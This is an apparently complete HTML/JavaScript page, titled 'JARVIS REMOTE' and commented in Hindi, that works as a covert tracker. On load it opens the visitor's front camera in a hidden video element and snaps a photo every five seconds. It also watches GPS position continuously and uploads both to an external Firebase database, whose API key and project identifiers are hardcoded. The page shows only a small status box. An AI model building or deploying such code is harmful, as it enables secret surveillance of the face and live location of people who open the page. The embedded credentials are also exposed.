<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JARVIS REMOTE - COMBINED HIST</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
        .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 40px; }
        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; }
        #v, canvas { display: none; }
        .live-dot { width: 10px; height: 10px; background-color: #39ff14; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
    </style>
</head>
<body>
    <div class="control-box">
        <h2>JARVIS HIST-LINK v7 <span class="live-dot"></span></h2>
        <p style="color: #888; font-size: 13px;">फोटो + लोकेशन कंबाइंड हिस्ट्री मोड ऑन है</p>
        <video id="v" autoplay playsinline muted></video>
        <canvas id="c"></canvas>
        <div class="status-text" id="log-status">सिस्टम लोड हो रहा है...</div>
    </div>

    <script>
        const firebaseConfig = {
          apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc",
          authDomain: "army-cb492.firebaseapp.com",
          databaseURL: "https://army-cb492-default-rtdb.firebaseio.com",
          projectId: "army-cb492",
          appId: "1:449848409517:web:386ad1b570731b6ec4f524"
        };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // ग्लोबल वेरिएबल्स ताकि हमेशा लेटेस्ट जीपीएस डेटा उपलब्ध रहे
        let currentLat = 0;
        let currentLon = 0;

        window.onload = function() {
            startCombinedTracking();
        };

        async function startCombinedTracking() {
            const statusDiv = document.getElementById('log-status');
            statusDiv.innerHTML = "📡 सिस्टम एक्टिवेट किया जा रहा है...";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;

                // लगातार बैकग्राउंड में GPS को ट्रैक करना और वेरिएबल्स में सेव रखना
                navigator.geolocation.watchPosition((pos) => {
                    currentLat = pos.coords.latitude;
                    currentLon = pos.coords.longitude;
                    
                    // मेन लाइव नोड को भी तुरंत अपडेट रखें
                    database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
                    statusDiv.innerHTML = `📍 GPS ट्रैक एक्टिव: ${currentLat.toFixed(5)}, ${currentLon.toFixed(5)}`;
                }, err => {
                    statusDiv.innerHTML = "❌ GPS एरर: कृपया लोकेशन अलाउ करें।";
                }, { enableHighAccuracy: true });

                video.onloadedmetadata = () => {
                    // कैमरे के ऑन होने के लिए 2 सेकंड रुकें ताकि ब्लैक स्क्रीन न आए
                    setTimeout(() => {
                        captureCombinedData(); 
                        setInterval(captureCombinedData, 5000); // हर 5 सेकंड में नया कंबाइंड रिकॉर्ड
                    }, 2000);
                };

            } catch(e) {
                statusDiv.innerHTML = "❌ परमिशन एरर: कैमरा/लोकेशन एक्सेस ऑन करें बॉस!";
            }
        }

        function captureCombinedData() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            
            c.width = 240; 
            c.height = 180;
            c.getContext('2d').drawImage(v, 0, 0, 240, 180);
            const compressedPhoto = c.toDataURL('image/jpeg', 0.4); 

            const timestamp = Date.now();
            const currentTimeString = new Date().toLocaleTimeString();

            // 1. मेन लाइव डैशबोर्ड अपडेट (ताकि स्क्रीन पर तुरंत दिखे)
            database.ref('live_detect').update({
                photo: compressedPhoto,
                last_updated: timestamp
            });

            // 2. 🌟 जार्विस हिस्ट्री नोड (यहाँ फोटो और लोकेशन दोनों एक ही जगह साथ में सेव होंगे)
            database.ref('jarvis_history/' + timestamp).set({
                time: currentTimeString,
                photo: compressedPhoto,
                location_record: {
                    lat: currentLat,
                    lon: currentLon
                }
            });
            
            console.log("कंबाइंड रिकॉर्ड सिंक हुआ: " + currentTimeString);
        }
    </script>
</body>
</html>
